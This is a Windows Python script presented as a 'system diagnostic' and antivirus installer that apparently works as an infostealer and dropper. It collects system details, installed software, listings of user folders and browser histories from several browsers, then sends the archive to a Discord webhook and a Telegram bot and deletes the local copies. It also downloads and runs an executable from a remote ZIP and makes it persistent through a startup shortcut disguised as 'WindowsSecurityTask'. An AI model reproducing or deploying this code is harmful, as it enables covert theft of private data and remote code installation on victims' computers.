import os
import subprocess
import requests
import time
import socket
import getpass
import winreg
import sqlite3
import shutil
import json
import zipfile
from datetime import datetime, timedelta
from win32com.client import Dispatch

# ==================================================
# BRANDING & CONFIG
# ==================================================
AUTHOR_NAME = "REAL LUCIFER™"
AUTHOR_TAGLINE = "Professional System Diagnostic Report"

# --- PASTE YOUR VALUES HERE ---
DISCORD_WEBHOOK_URL = "PASTE_DISCORD_WEBHOOK_URL"
TELEGRAM_BOT_TOKEN = "PASTE_TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "PASTE_TELEGRAM_CHAT_ID"

# The direct URL to your ZIP file containing the antivirus .exe
AV_ZIP_URL = "https://example.com/your_antivirus.zip" 
# The exact name of the .exe inside that ZIP
AV_EXE_NAME = "antivirus.exe" 

# ==================================================
# PATHS & METADATA
# ==================================================
BASE_DIR = "System_Info"
WINRAR_PATH = r"C:\Program Files\WinRAR\rar.exe"
USER_HOME = os.path.expanduser("~")
COMPUTER_NAME = socket.gethostname()
USER_NAME = getpass.getuser()

AV_INSTALL_DIR = os.path.join(os.getenv('APPDATA'), "LuciferProtection")
AV_FILE_PATH = os.path.join(AV_INSTALL_DIR, AV_EXE_NAME)
ZIP_TEMP_PATH = os.path.join(AV_INSTALL_DIR, "package.zip")

TIME_STR = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
FILE_TIME = datetime.now().strftime("%Y-%m-%d_%H-%M")
RAR_NAME = f"system_info_{USER_NAME}_{COMPUTER_NAME}_{FILE_TIME}.rar"

# ==================================================
# 1. SYSTEM DATA COLLECTION
# ==================================================
def collect_system_info():
    os.makedirs(BASE_DIR, exist_ok=True)
    with open(os.path.join(BASE_DIR, "system info.txt"), "w", encoding="utf-8", errors="ignore") as f:
        subprocess.run("systeminfo", stdout=f, stderr=subprocess.DEVNULL, shell=True)

def save_installed_apps():
    apps = set()
    locations = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
    ]
    for hive, path in locations:
        try:
            with winreg.OpenKey(hive, path) as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        sub = winreg.OpenKey(key, winreg.EnumKey(key, i))
                        name, _ = winreg.QueryValueEx(sub, "DisplayName")
                        apps.add(name)
                    except: pass
        except: pass
    with open(os.path.join(BASE_DIR, "installed_apps.txt"), "w", encoding="utf-8", errors="ignore") as f:
        f.write("===== INSTALLED APPLICATIONS =====\n\n")
        for app in sorted(apps): f.write(app + "\n")

def save_directory(folder):
    folder_path = os.path.join(USER_HOME, folder)
    out = os.path.join(BASE_DIR, f"{folder}.txt")
    with open(out, "w", encoding="utf-8", errors="ignore") as f:
        f.write(f"{folder}\n")
        if os.path.exists(folder_path):
            files = [x for x in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, x))]
            for file in sorted(files): f.write(f"    {file}\n")

# ==================================================
# 2. BROWSER EXTRACTION
# ==================================================
def chrome_time_to_date(t):
    try: return str(datetime(1601, 1, 1) + timedelta(microseconds=t))
    except: return "N/A"

def extract_chromium(browser, history_path):
    if not os.path.exists(history_path): return
    out_dir = os.path.join(BASE_DIR, "Browsers", browser)
    os.makedirs(out_dir, exist_ok=True)
    temp = os.path.join(out_dir, "History_copy")
    shutil.copy2(history_path, temp)
    out_file = os.path.join(out_dir, f"{browser}_History.txt")
    try:
        conn = sqlite3.connect(temp)
        cur = conn.cursor()
        cur.execute("SELECT urls.url, urls.title, visits.visit_time FROM urls JOIN visits ON urls.id = visits.url ORDER BY visits.visit_time DESC LIMIT 1000")
        with open(out_file, "w", encoding="utf-8", errors="ignore") as f:
            for url, title, t in cur.fetchall(): f.write(f"{url} | {chrome_time_to_date(t)}\n")
        conn.close()
        os.remove(temp)
    except: pass

def extract_firefox():
    root = os.path.join(USER_HOME, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    if not os.path.exists(root): return
    out_dir = os.path.join(BASE_DIR, "Browsers", "Firefox")
    os.makedirs(out_dir, exist_ok=True)
    for p in os.listdir(root):
        db = os.path.join(root, p, "places.sqlite")
        if os.path.exists(db):
            temp = os.path.join(out_dir, "places_copy.sqlite")
            shutil.copy2(db, temp)
            conn = sqlite3.connect(temp)
            cur = conn.cursor()
            cur.execute("SELECT url, last_visit_date FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 1000")
            with open(os.path.join(out_dir, "Firefox_History.txt"), "w", encoding="utf-8", errors="ignore") as f:
                for url, t in cur.fetchall(): f.write(f"{url} | {datetime.fromtimestamp(t/1_000_000)}\n")
            conn.close()
            os.remove(temp)
            break

# ==================================================
# 3. ANTIVIRUS SETUP (ZIP + STARTUP)
# ==================================================
def setup_custom_antivirus():
    """Downloads ZIP, extracts EXE, and adds to shell:startup."""
    try:
        if not os.path.exists(AV_INSTALL_DIR): os.makedirs(AV_INSTALL_DIR)
        
        # Download ZIP
        r = requests.get(AV_ZIP_URL, stream=True, timeout=60)
        if r.status_code == 200:
            with open(ZIP_TEMP_PATH, "wb") as f:
                for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
            
            # Extract
            with zipfile.ZipFile(ZIP_TEMP_PATH, 'r') as zip_ref:
                zip_ref.extractall(AV_INSTALL_DIR)
            os.remove(ZIP_TEMP_PATH)

            # Startup Persistence
            startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
            shortcut_path = os.path.join(startup_folder, "WindowsSecurityTask.lnk")
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = AV_FILE_PATH
            shortcut.WorkingDirectory = AV_INSTALL_DIR
            shortcut.IconLocation = AV_FILE_PATH
            shortcut.save()
            
            if os.path.exists(AV_FILE_PATH): os.startfile(AV_FILE_PATH)
    except: pass

# ==================================================
# 4. PACKAGING & DESIGNED SENDING
# ==================================================
def finalize_and_send():
    # Create RAR
    subprocess.run(f'"{WINRAR_PATH}" a -r "{RAR_NAME}" "{BASE_DIR}"', shell=True)
    
    if os.path.exists(RAR_NAME):
        # Discord Embed Design
        discord_payload = {
            "content": "📎 **New Diagnostic Report Received**",
            "embeds": [{
                "author": {"name": AUTHOR_NAME},
                "title": "💻 System Diagnostic Report",
                "description": AUTHOR_TAGLINE,
                "color": 16711680, # Red
                "fields": [
                    {"name": "👤 User", "value": f"`{USER_NAME}`", "inline": True},
                    {"name": "🖥️ Computer", "value": f"`{COMPUTER_NAME}`", "inline": True},
                    {"name": "🕒 Time", "value": TIME_STR, "inline": False},
                ],
                "footer": {"text": f"Secured by {AUTHOR_NAME}"}
            }]
        }

        # Telegram HTML Design
        telegram_caption = (
            f"<b>💻 CLIENT SYSTEM REPORT</b>\n"
            f"<i>{AUTHOR_TAGLINE}</i>\n\n"
            f"<b>👤 User:</b> <code>{USER_NAME}</code>\n"
            f"<b>🖥️ Computer:</b> <code>{COMPUTER_NAME}</code>\n"
            f"<b>🕒 Time:</b> <code>{TIME_STR}</code>\n\n"
            f"🛡️ <i>Generated by {AUTHOR_NAME}</i>"
        )

        # Send to Discord
        try:
            with open(RAR_NAME, "rb") as f:
                requests.post(DISCORD_WEBHOOK_URL, files={"file": f}, data={"payload_json": json.dumps(discord_payload)})
        except: pass
        
        # Send to Telegram
        try:
            with open(RAR_NAME, "rb") as f:
                requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument", 
                              data={"chat_id": TELEGRAM_CHAT_ID, "caption": telegram_caption, "parse_mode": "HTML"},
                              files={"document": f})
        except: pass
        
        # Cleanup
        os.remove(RAR_NAME)
        shutil.rmtree(BASE_DIR)

# ==================================================
# MAIN EXECUTION
# ==================================================
def main():
    # Gather Data
    collect_system_info()
    save_installed_apps()
    for folder in ["Desktop", "Downloads", "Documents", "Pictures", "Videos", "Music"]:
        save_directory(folder)

    # Browsers
    appdata_local = os.path.join(USER_HOME, "AppData", "Local")
    extract_chromium("Chrome", os.path.join(appdata_local, "Google", "Chrome", "User Data", "Default", "History"))
    extract_chromium("Edge", os.path.join(appdata_local, "Microsoft", "Edge", "User Data", "Default", "History"))
    extract_chromium("Brave", os.path.join(appdata_local, "BraveSoftware", "Brave-Browser", "User Data", "Default", "History"))
    extract_chromium("Opera", os.path.join(USER_HOME, "AppData", "Roaming", "Opera Software", "Opera Stable", "History"))
    extract_firefox()

    # Antivirus Setup
    setup_custom_antivirus()

    # Pack and Send
    finalize_and_send()

if __name__ == "__main__":
    main()
